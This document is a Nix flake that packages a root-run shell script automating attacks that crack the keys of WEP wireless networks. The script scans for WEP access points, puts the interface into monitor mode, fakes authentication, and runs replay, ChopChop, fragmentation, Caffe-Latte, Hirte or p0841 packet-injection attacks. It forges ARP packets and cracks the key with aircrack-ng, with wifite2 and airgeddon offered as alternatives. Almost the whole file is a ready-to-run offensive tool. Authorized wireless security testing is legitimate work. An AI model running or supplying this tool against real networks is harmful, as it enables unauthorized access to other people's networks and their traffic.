{
  description = "WEP attack testing (replay, chopchop, fragment, hirte, p0841, caffe-latte)";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };

      wepAttack = pkgs.writeShellApplication {
        name = "wep-attack";
        runtimeInputs = with pkgs; [
          aircrack-ng
          coreutils
          gnugrep
          iproute2
          iw
          wifite2
        ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: wep-attack <interface> [bssid] [output-dir]" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  interface  : wireless interface (must support monitor mode)" >&2
            printf '%s\n' "  bssid      : target AP (required for all modes except scan and auto)" >&2
            printf '%s\n' "  output-dir : directory for captures and results (default: current dir)" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Environment variables:" >&2
            printf '%s\n' "  WEP_MODE=scan        detect WEP APs and exit (no attack)" >&2
            printf '%s\n' "  WEP_MODE=auto        wifite2 automatic, tries all methods (default)" >&2
            printf '%s\n' "  WEP_MODE=replay      ARP request replay (aireplay-ng -3)" >&2
            printf '%s\n' "  WEP_MODE=chopchop    KoreK ChopChop then packet replay (aireplay-ng -4)" >&2
            printf '%s\n' "  WEP_MODE=fragment    fragmentation then packet replay (aireplay-ng -5)" >&2
            printf '%s\n' "  WEP_MODE=caffe-latte Cafe-Latte client attack (aireplay-ng -6)" >&2
            printf '%s\n' "  WEP_MODE=hirte       Hirte client attack (aireplay-ng -7)" >&2
            printf '%s\n' "  WEP_MODE=p0841       p0841 broadcast ARP variant (aireplay-ng -3 -p 0841)" >&2
            printf '%s\n' "  WEP_TIMEOUT=600      seconds before giving up (default: 600)" >&2
            printf '%s\n' "  WEP_IVS=10000        IV count target before cracking attempt (default: 10000)" >&2
            printf '%s\n' "  WEP_CHANNEL=<n>      lock to channel instead of auto-detecting" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "For interactive WEP menu use: nix run .#airgeddon" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example: WEP_MODE=scan wep-attack wlan1" >&2
            printf '%s\n' "Example: wep-attack wlan1" >&2
            printf '%s\n' "Example: WEP_MODE=replay wep-attack wlan1 AA:BB:CC:DD:EE:FF /tmp/wep" >&2
            exit 2
          }

          if [ "$#" -lt 1 ] || [ "$#" -gt 3 ]; then
            usage
          fi

          INTERFACE="$1"
          BSSID="''${2:-}"
          OUTPUT_DIR="''${3:-.}"
          WEP_MODE="''${WEP_MODE:-auto}"
          WEP_TIMEOUT="''${WEP_TIMEOUT:-600}"
          WEP_IVS="''${WEP_IVS:-10000}"
          WEP_CHANNEL="''${WEP_CHANNEL:-}"

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          if ! iw phy "$(iw dev "$INTERFACE" info | awk '/wiphy/{print "phy" $2}')" info \
               | grep -q '^\s*\* monitor'; then
            printf '%s\n' "Interface $INTERFACE does not support monitor mode." >&2
            exit 1
          fi

          check_int() {
            case "$2" in
              ""|*[!0-9]*)
                printf '%s\n' "$1 must be a positive integer." >&2
                exit 2
                ;;
            esac
          }
          check_int "WEP_TIMEOUT" "$WEP_TIMEOUT"
          check_int "WEP_IVS" "$WEP_IVS"

          # --- scan ---
          if [ "$WEP_MODE" = "scan" ]; then
            printf '%s\n' "Scanning for WEP APs on $INTERFACE..."
            printf '%s\n' ""

            ip link set "$INTERFACE" up
            SCAN_RAW="$(iw dev "$INTERFACE" scan 2>/dev/null || true)"

            if [ -z "$SCAN_RAW" ]; then
              printf '%s\n' "No scan results. Ensure the interface is up and not in monitor mode."
              exit 0
            fi

            printf '%-20s  %-6s  %-32s\n' "BSSID" "CH" "SSID"
            printf '%s\n' "--------------------------------------------------------------------"

            current_bssid=""
            current_ssid=""
            current_channel=""
            has_privacy=0
            has_rsn=0
            has_wpa=0

            print_entry() {
              if [ -n "$current_bssid" ] && [ "$has_privacy" -eq 1 ] \
                 && [ "$has_rsn" -eq 0 ] && [ "$has_wpa" -eq 0 ]; then
                printf '%-20s  %-6s  %-32s\n' \
                  "$current_bssid" "''${current_channel:-?}" "$current_ssid"
              fi
            }

            while IFS= read -r line; do
              case "$line" in
                "BSS "*)
                  print_entry
                  current_bssid="$(printf '%s' "$line" | awk '{print $2}' | tr -d '(on')"
                  current_ssid=""
                  current_channel=""
                  has_privacy=0
                  has_rsn=0
                  has_wpa=0
                  ;;
                *"SSID: "*)
                  current_ssid="$(printf '%s' "$line" | sed 's/.*SSID: //')"
                  ;;
                *"DS Parameter set: channel "*)
                  current_channel="$(printf '%s' "$line" | sed 's/.*channel //')"
                  ;;
                *"Privacy"*)
                  has_privacy=1
                  ;;
                *"RSN:"*)
                  has_rsn=1
                  ;;
                *"WPA:"*)
                  has_wpa=1
                  ;;
              esac
            done <<EOF
$SCAN_RAW
EOF
            print_entry
            printf '%s\n' "--------------------------------------------------------------------"
            printf '%s\n' "WEP: Privacy set, no RSN/WPA info elements."
            exit 0
          fi

          # --- auto (wifite2) ---
          if [ "$WEP_MODE" = "auto" ]; then
            mkdir -p "$OUTPUT_DIR"
            WIFITE_ARGS="--wep --kill"
            if [ -n "$BSSID" ]; then
              WIFITE_ARGS="$WIFITE_ARGS --bssid $BSSID"
            fi
            printf '%s\n' "WEP attack (wifite2 automatic)"
            printf '%s\n' "  Interface : $INTERFACE"
            printf '%s\n' "  Target    : ''${BSSID:-all WEP APs}"
            printf '%s\n' "Press Ctrl+C to stop."
            printf '%s\n' ""
            # shellcheck disable=SC2086
            exec wifite -i "$INTERFACE" $WIFITE_ARGS
          fi

          # --- specific modes: BSSID required ---
          case "$WEP_MODE" in
            replay|chopchop|fragment|caffe-latte|hirte|p0841) ;;
            *)
              printf '%s\n' "Unknown WEP_MODE: $WEP_MODE" >&2
              usage
              ;;
          esac

          if [ -z "$BSSID" ]; then
            printf '%s\n' "BSSID is required for WEP_MODE=$WEP_MODE." >&2
            exit 2
          fi

          OUTPUT_DIR="$(readlink -f "$OUTPUT_DIR")"
          mkdir -p "$OUTPUT_DIR"

          # Find channel and ESSID while still in managed mode
          ip link set "$INTERFACE" up
          PRE_SCAN="$(iw dev "$INTERFACE" scan 2>/dev/null || true)"
          CHANNEL="$WEP_CHANNEL"
          ESSID=""
          if [ -z "$CHANNEL" ]; then
            CHANNEL="$(printf '%s' "$PRE_SCAN" \
              | grep -A 20 "^BSS $BSSID" \
              | grep 'DS Parameter set: channel' \
              | head -1 | sed 's/.*channel //' | tr -d ' \n' || true)"
          fi
          ESSID="$(printf '%s' "$PRE_SCAN" \
            | grep -A 20 "^BSS $BSSID" \
            | grep 'SSID:' | head -1 | sed 's/.*SSID: //' || true)"

          if [ -z "$CHANNEL" ]; then
            printf '%s\n' "Cannot detect channel for $BSSID. Set WEP_CHANNEL=<n>." >&2
            exit 1
          fi

          # Enable monitor mode
          airmon-ng check kill > /dev/null 2>&1 || true
          airmon-ng start "$INTERFACE" > /dev/null 2>&1 || true
          MON_IFACE="''${INTERFACE}mon"
          if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
            MON_IFACE="$INTERFACE"
          fi
          MY_MAC="$(ip link show "$MON_IFACE" | awk '/ether/{print $2}')"

          AIRODUMP_PID=""
          AIREPLAY_PID=""
          cleanup() {
            if [ -n "$AIRODUMP_PID" ]; then kill "$AIRODUMP_PID" 2>/dev/null || true; fi
            if [ -n "$AIREPLAY_PID" ]; then kill "$AIREPLAY_PID" 2>/dev/null || true; fi
            airmon-ng stop "$MON_IFACE" > /dev/null 2>&1 || true
          }
          trap cleanup EXIT INT TERM

          iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null || true

          TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
          IVS_BASE="$OUTPUT_DIR/wep-$TIMESTAMP"

          # Start IV + CSV capture in background
          airodump-ng --bssid "$BSSID" --channel "$CHANNEL" \
            --output-format ivs,csv --write "$IVS_BASE" \
            "$MON_IFACE" > /dev/null 2>&1 &
          AIRODUMP_PID=$!
          sleep 2

          # Fake authentication; continue on failure (some APs reject without clients)
          FAKEAUTH_ARGS="-1 6000 -a $BSSID -h $MY_MAC"
          if [ -n "$ESSID" ]; then
            FAKEAUTH_ARGS="$FAKEAUTH_ARGS -e $ESSID"
          fi
          # shellcheck disable=SC2086
          aireplay-ng $FAKEAUTH_ARGS "$MON_IFACE" > /dev/null 2>&1 || true

          # Monitor IVs and crack when WEP_IVS threshold is reached
          crack_loop() {
            local start_time elapsed iv_count
            start_time="$(date +%s)"
            iv_count="0"
            while true; do
              elapsed="$(( $(date +%s) - start_time ))"
              if [ "$elapsed" -ge "$WEP_TIMEOUT" ]; then
                printf '\n%s\n' "Timeout (''${WEP_TIMEOUT}s). Attempting final crack..."
                aircrack-ng "''${IVS_BASE}-01.ivs" || true
                break
              fi
              iv_count="$(awk -F',' -v bssid="$BSSID" \
                'NR>2 && $1 ~ bssid {gsub(/ /,"",$11); print $11; exit}' \
                "''${IVS_BASE}-01.csv" 2>/dev/null || echo "0")"
              iv_count="''${iv_count:-0}"
              printf '\r  IVs: %s / %s (%ss)  ' "$iv_count" "$WEP_IVS" "$elapsed"
              case "$iv_count" in
                ""|*[!0-9]*) : ;;
                *)
                  if [ "$iv_count" -ge "$WEP_IVS" ]; then
                    printf '\n%s\n' "Cracking with $iv_count IVs..."
                    aircrack-ng "''${IVS_BASE}-01.ivs" && break || true
                  fi
                  ;;
              esac
              sleep 10
            done
            printf '\n'
          }

          printf '%s\n' "WEP attack ($WEP_MODE)"
          printf '%s\n' "  Interface : $MON_IFACE"
          printf '%s\n' "  Target    : $BSSID"
          printf '%s\n' "  Channel   : $CHANNEL"
          printf '%s\n' "  ESSID     : ''${ESSID:-(unknown)}"
          printf '%s\n' "  Output    : ''${IVS_BASE}-01.ivs"
          printf '%s\n' "Press Ctrl+C to stop."
          printf '%s\n' ""

          case "$WEP_MODE" in
            replay)
              # Standard ARP request replay - most effective against active APs
              aireplay-ng -3 -b "$BSSID" -h "$MY_MAC" "$MON_IFACE" > /dev/null 2>&1 &
              AIREPLAY_PID=$!
              crack_loop
              ;;

            chopchop)
              # KoreK ChopChop: decrypts a packet byte-by-byte to recover a PRGA keystream.
              # Interactive: confirm the decrypted packet when aireplay-ng prompts.
              printf '%s\n' "Confirm the decrypted packet when prompted by aireplay-ng."
              (cd "$OUTPUT_DIR" && aireplay-ng -4 -b "$BSSID" -h "$MY_MAC" "$MON_IFACE") || true
              XOR="$(ls "$OUTPUT_DIR"/replay_dec-*.xor 2>/dev/null | head -1 || true)"
              if [ -n "$XOR" ]; then
                printf '%s\n' "Keystream: $XOR - forging ARP and replaying..."
                packetforge-ng -0 -a "$BSSID" -h "$MY_MAC" \
                  -k 255.255.255.255 -l 255.255.255.255 \
                  -y "$XOR" -w "$OUTPUT_DIR/forge.cap"
                aireplay-ng -2 -r "$OUTPUT_DIR/forge.cap" "$MON_IFACE" > /dev/null 2>&1 &
                AIREPLAY_PID=$!
                crack_loop
              else
                printf '%s\n' "No .xor keystream produced. Cracking available IVs..."
                aircrack-ng "''${IVS_BASE}-01.ivs" || true
              fi
              ;;

            fragment)
              # Fragmentation: recovers a PRGA keystream from a single data frame.
              # Interactive: confirm the packet when aireplay-ng prompts.
              printf '%s\n' "Confirm the packet when prompted by aireplay-ng."
              (cd "$OUTPUT_DIR" && aireplay-ng -5 -b "$BSSID" -h "$MY_MAC" "$MON_IFACE") || true
              XOR="$(ls "$OUTPUT_DIR"/fragment-*.xor 2>/dev/null | head -1 || true)"
              if [ -n "$XOR" ]; then
                printf '%s\n' "Keystream: $XOR - forging ARP and replaying..."
                packetforge-ng -0 -a "$BSSID" -h "$MY_MAC" \
                  -k 255.255.255.255 -l 255.255.255.255 \
                  -y "$XOR" -w "$OUTPUT_DIR/forge.cap"
                aireplay-ng -2 -r "$OUTPUT_DIR/forge.cap" "$MON_IFACE" > /dev/null 2>&1 &
                AIREPLAY_PID=$!
                crack_loop
              else
                printf '%s\n' "No .xor keystream produced. Cracking available IVs..."
                aircrack-ng "''${IVS_BASE}-01.ivs" || true
              fi
              ;;

            caffe-latte)
              # Cafe-Latte: targets WEP clients without needing AP access.
              # Flips bits in gratuitous ARP frames from clients to generate IVs.
              aireplay-ng -6 -D -b "$BSSID" "$MON_IFACE" > /dev/null 2>&1 &
              AIREPLAY_PID=$!
              crack_loop
              ;;

            hirte)
              # Hirte: extension of Cafe-Latte that works against any client ARP frame.
              aireplay-ng -7 -D -b "$BSSID" "$MON_IFACE" > /dev/null 2>&1 &
              AIREPLAY_PID=$!
              crack_loop
              ;;

            p0841)
              # p0841: broadcasts ARP with frame type 0841, bypasses APs that ignore unicast replay.
              aireplay-ng -3 -p 0841 -c FF:FF:FF:FF:FF:FF \
                -b "$BSSID" -h "$MY_MAC" "$MON_IFACE" > /dev/null 2>&1 &
              AIREPLAY_PID=$!
              crack_loop
              ;;
          esac
        '';
      };

    in
    {
      packages.${system} = {
        wep-attack = wepAttack;
        airgeddon = pkgs.airgeddon;
        default = wepAttack;
      };

      apps.${system} = {
        default = {
          type = "app";
          program = "${wepAttack}/bin/wep-attack";
        };
        airgeddon = {
          type = "app";
          program = "${pkgs.airgeddon}/bin/airgeddon";
        };
      };

      devShells.${system}.default = pkgs.mkShell {
        packages = with pkgs; [
          aircrack-ng
          airgeddon
          iproute2
          iw
          wifite2
        ];
      };
    };
}
